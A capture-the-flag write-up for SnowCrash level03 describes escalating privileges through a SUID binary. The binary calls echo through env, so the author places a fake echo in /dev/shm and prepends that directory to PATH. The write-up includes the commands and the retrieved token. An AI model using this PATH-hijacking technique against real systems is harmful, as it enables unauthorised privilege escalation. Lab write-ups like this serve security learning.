We saw that we hae a binary file `level03`.
```
$ Exploit me
```
It just echo something.

### SUID

if we `ls -la` we saw that :
`-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
`
`-rws` -> `s` mean SUID that means the program runs with the rights of flag03 user, with sudo.

The the strategy is to make this function execute the getflag function.

### ltrace

With ltrace we saw that

``` level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7d4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                = 2003
geteuid()                                                = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)      = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)      = 0
system("/usr/bin/env echo Exploit me"
<... system resumed> )                                   =
```
we use the environment variable to locate and launch echo.

### Replace echo real function by getflag function

`level03@SnowCrash:~$ ls -ld /tmp /var/tmp /dev/shm` allow us to find a repo with the rights to create file

-> We can create our fake echo 

-> We have to specify the location of our echo in PATH envaronment variable. It has to be the `first` echo function that is matched to be executed.

### Change the env variable PATH

```
level03@SnowCrash:~$ export PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$
```